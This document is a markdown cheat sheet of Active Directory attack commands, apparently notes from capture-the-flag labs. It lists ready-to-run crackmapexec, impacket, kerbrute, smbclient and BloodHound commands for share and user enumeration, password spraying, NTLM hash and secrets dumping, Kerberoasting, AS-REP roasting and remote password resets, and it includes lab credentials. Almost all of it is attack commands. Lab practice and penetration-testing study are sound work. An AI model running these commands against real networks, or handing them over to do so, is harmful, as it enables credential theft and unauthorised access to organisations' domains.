
# AD_commands



### `crackmapexec`

enumerate the `smb` shares
```
crackmapexec smb 10.10.113.103 -u 'anonymous' -p '' --shares
```
enumerate the users
```bash
crackmapexec smb thm.corp -u 'guest' -p '' --rid-brute | grep SidTypeUser
```
spraying passwords among users
```bash
crackmapexec smb <target-ip> -u users.txt -p passwords.txt --spray
```
dump `NTLM` hashes
```bash
crackmapexec smb 192.168.1.0/24 -u admin -p password123 --ntlm > hash
```
List all users in a domain
```bash
crackmapexec smb 192.168.1.10 -u admin -p password123 --users > users
```
List all groups
```bash
crackmapexec smb 192.168.1.10 -u admin -p password123 --groups > groups
```

---

### `impacket`

### **Authentication & Password Dumping**

`secretsdump` : Extracts credentials, including `NTLM` hashes, from Windows systems via various techniques.
```bash
impacket-secretsdump vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.217.111
```

Get `SPNs` : Service Principal Names `(SPNs)` that can be used for `Kerberos` authentication attacks `(Kerberoasting)`.
```bash
impacket-GetUserSPNs -request lab.enterprise.thm/nik:ToastyBoi! -dc-ip 10.10.141.253 -output hash
```

`lookupsid`
This tool queries a remote machine for information about SIDs. It can enumerate domain user and group information by querying the `Security Account Manager` (SAM) database over the `SMB` protocol.
```bash
impacket-lookupsid anonymous@10.10.12.26 -no-pass -domain-sids
```

`GetNPUsers` : `ASREP` Roasting.

When you use the **`GetNPUsers.py`** tool from `Impacket` to dump users with the **"Do not require `Kerberos preauthentication`** option enabled, the output typically provides the following:
1. **Usernames**: A list of usernames that have the `preauthentication` requirement disabled.
2. **`Kerberos AS-REQ` Hashes**: If the user has `preauthentication` disabled, the tool retrieves the `Kerberos AS-REQ` hash (Ticket Granting Ticket Request). This hash can be cracked offline to retrieve the user's `plaintext` password using tools like **`hashcat`**.

get a specific format of specific `IP` of specific domain
```bash
impacket-GetNPUsers -request -format john  lab.enterprise.thm/nik:ToastyBoi! -dc-ip 10.10.141.253 -output hash
```

just the domain
```bash
impacket-GetNPUsers thm.corp/TABATHA_BRITT
```

from users list
```bash
impacket-GetNPUsers the.corp/ -dc-ip 10.10.42.254 -usersfile users -format john -outputfile hash -no-pass -request
```

`smbpasswd` :
The **`impacket-smbpasswd`** tool is part of the` Impacket` suite, used to change or reset a user's password on a remote `SMB` (Windows) system via the **`SAMR`** (Security Account Manager Remote) protocol.

```bash
impacket-smbpasswd DOMAIN/john.doe:oldpassword@192.168.1.10 -newpass NewPassword123!
```

---

### `kerbrute`

This command attempts to enumerate valid usernames from a provided list.

userenum
```bash
kerbrute userenum -d the.corp -dc 10.10.42.254 users
```

`passwordspray`

```bash
kerbrute passwordspray -d the.corp -dc 10.10.42.254 -U admin passwords
```
- -d the.corp : Specifies the domain name. 
- -dc 10.10.42.254 : The IP address of the Domain Controller. 
- -U admin : The username to brute-force. passwords.txt : The file containing the list of passwords to try

```bash
kerbrute passwordspray -d the.corp -dc 10.10.42.254 -P "Password123" users
```

---

### `SMB`

List the shares
```bash
smbclient -L //192.168.1.10 -U username
```
Get into it
```bash
smbclient //192.168.1.10/shared_folder -U username
```

---


### bloodhound
#### Neo4j
```bash
sudo neo4j console
```

#### bloodhound
```bash
sudo bloodhound --no-sandbox
```
#### bloodhound-python
```bash
bloodhound-python -ns 10.10.149.218 --dns-tcp -d THM.CORP -u 'automate' -p 'Passw0rd1' -c All --zip
```


---


